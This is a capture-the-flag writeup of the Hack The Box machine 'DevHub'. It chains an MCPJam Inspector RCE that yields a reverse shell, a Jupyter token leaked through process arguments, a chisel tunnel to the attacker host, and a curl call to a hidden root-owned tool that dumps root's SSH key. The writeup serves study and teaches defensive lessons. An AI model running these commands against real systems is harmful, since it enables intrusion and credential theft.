# DevHub — HackTheBox Writeup

**Platform:** [Hack The Box](https://app.hackthebox.com/machines/DevHub)
**Difficulty:** `Medium`
**OS:** `Linux`
**Author:** samurai

---

## Overview

DevHub is a Linux machine built around the emerging attack surface of MCP (Model Context Protocol) services. The attack chain involves exploiting a remote code execution vulnerability in the MCPJam Inspector service (CVE-2026-23744) to gain an initial foothold as `mcp-dev`, discovering a Jupyter Lab instance with a leaked token exposed in process arguments to pivot to the `analyst` user, reading a privileged internal Flask MCP server's source code to obtain an API key, and finally calling a hidden admin tool in that root-owned service to dump root's SSH private key and achieve full system compromise.

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Initial Foothold — CVE-2026-23744 (MCPJam RCE)](#initial-foothold)
3. [Lateral Movement — Jupyter Lab Token Leak](#lateral-movement)
4. [Privilege Escalation — OPSMCP Hidden Admin Tool](#privilege-escalation)

---

## Reconnaissance

Port scanning was performed using Nmap for service and version detection.

```bash
nmap -A 10.129.10.222 -p22,80,6274
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp   open  http    nginx 1.18.0 — DevHub Internal Development Platform
6274/tcp open  http    MCPJam Inspector (Node.js)
```

### Open Ports Summary

| Port | Protocol | Service | Notes |
|------|----------|---------|-------|
| 22 | TCP | SSH | OpenSSH 8.9p1 |
| 80 | TCP | HTTP | nginx — DevHub platform |
| 6274 | TCP | HTTP | MCPJam Inspector v1.4.2 |

Port 6274 served the MCPJam Inspector web UI, identified by its title and static assets in the Nmap fingerprint response.

---

## Initial Foothold

### CVE-2026-23744 — MCPJam Inspector Remote Code Execution

A public exploit for CVE-2026-23744 was found targeting the MCPJam Inspector's `/api/mcp/connect` endpoint. The exploit script initially failed with an SSL error:

```
ssl.SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number
```

The script was hardcoded to use HTTPS, but the service on port 6274 runs plain HTTP. The fix was changing the URL scheme in `exploit.py`:

```python
# Before
url = "https://devhub.htb:6274/api/mcp/connect"

# After
url = "http://devhub.htb:6274/api/mcp/connect"
```

After fixing the URL, the exploit was triggered with a netcat listener:

```bash
rlwrap nc -nvlp 9001
```

A reverse shell was received as `mcp-dev`:

```
connect to [10.10.15.110] from (UNKNOWN) [10.129.10.222] 32946
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

Shell was stabilised with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Lateral Movement

### Internal Service Discovery

Enumerating listening ports on the target revealed two interesting localhost-only services:

```bash
ss -tulnp
```

```
tcp  LISTEN  127.0.0.1:5000   # Internal Flask MCP server
tcp  LISTEN  127.0.0.1:8888   # Jupyter Lab
```

### Jupyter Lab Token Leak via Process Arguments

Inspecting running Python processes exposed the Jupyter Lab token directly in the command line arguments:

```bash
ps aux | grep python
```

```
analyst  1061  ... jupyter-lab --ip=127.0.0.1 --port=8888 \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

This token was leaked because `ps aux` output is world-readable. A `chisel` binary was already present in `/tmp`, so it was used to tunnel port 8888 to the attacker machine:

```bash
# Attacker machine:
./chisel server -p 8080 --reverse

# Target:
/tmp/chisel client 10.10.15.110:8080 R:8888:127.0.0.1:8888
```

Navigating to the Jupyter Lab interface in a browser:

```
http://127.0.0.1:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Access was granted as `analyst`. The Jupyter terminal was used to read the privileged OPSMCP server source, since `analyst` owns the file and `mcp-dev` cannot:

```python
# In Jupyter terminal:
cat /opt/opsmcp/server.py
```

---

## Privilege Escalation

### OPSMCP — Root-Owned Internal Flask Server

Process enumeration had also revealed:

```
root  1066  ...  /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

The OPSMCP server runs as `root` on `127.0.0.1:5000`. Reading `server.py` via Jupyter exposed the hardcoded API key and a set of hidden tools not listed in the public `/tools/list` endpoint:

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    ...
}
```

The `ops._admin_dump` tool with `target=ssh_keys` reads `/root/.ssh/id_rsa` and returns it in the response. This was called from the reverse shell on the target:

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```

The response contained root's RSA private key. The key was returned with literal `\n` strings rather than real newlines, requiring a fix before use:

```bash
cat id_rsa | sed 's/\\n/\n/g' > id_rsa_fixed
chmod 600 id_rsa_fixed
ssh -i id_rsa_fixed root@devhub.htb
```

Root access was obtained:

```
root@devhub:~# cat root.txt
d3b665c6da8959419534727d6eb9f85e
```

---

## Attack Chain Summary

```
Port 6274 — MCPJam Inspector
    └─► CVE-2026-23744 (HTTP scheme fix) → RCE as mcp-dev
            └─► ps aux leaks Jupyter token (port 8888)
                    └─► Chisel tunnel → Jupyter Lab as analyst
                            └─► Read /opt/opsmcp/server.py → API key
                                    └─► OPSMCP hidden tool ops._admin_dump
                                            └─► Root SSH key dump → root@devhub
                                                    └─► root.txt ✓
```

---

## CVEs Referenced

| CVE | Component | Description |
|-----|-----------|-------------|
| CVE-2026-23744 | MCPJam Inspector | Remote code execution via `/api/mcp/connect` endpoint |

---

## Key Takeaways

- Always verify the URL scheme (HTTP vs HTTPS) when running exploit scripts against non-standard ports — SSL handshake errors are a common indicator of a scheme mismatch.
- Process arguments (`ps aux`) are world-readable on Linux and can expose secrets like API tokens or passwords passed on the command line. Sensitive values should be injected via environment variables or config files with restricted permissions.
- Internal services running as root dramatically amplify any vulnerability found during lateral movement. Even a simple API with hardcoded credentials becomes a direct path to full compromise when the process owner is root.
- Hidden API endpoints that are callable but not advertised represent a significant design risk — security through obscurity is not access control.
